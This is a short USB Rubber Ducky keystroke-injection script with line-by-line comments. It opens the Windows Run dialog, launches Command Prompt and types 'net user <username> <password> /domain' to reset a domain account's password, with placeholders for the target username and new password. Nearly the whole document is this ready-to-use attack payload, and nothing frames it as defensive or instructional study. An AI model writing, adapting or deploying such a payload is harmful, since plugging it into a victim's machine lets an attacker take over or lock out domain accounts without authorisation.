DELAY 500
REM Delay for 0.5 seconds
GUI r
REM Hold down the Windows key and press 'r' to open the Run dialog
DELAY 500
REM Delay for 0.5 seconds
STRING cmd
REM Type 'cmd' and press Enter to open Command Prompt
ENTER
REM Press Enter
DELAY 500
REM Delay for 0.5 seconds
STRING echo off && net user <username> <password> /domain
REM Replace '<username>' with the target username and '<password>' with the new password
ENTER
REM Press Enter
DELAY 500
REM Delay for 0.5 seconds
STRING exit
REM Type 'exit' and press Enter to close Command Prompt
ENTER
REM Press Enter
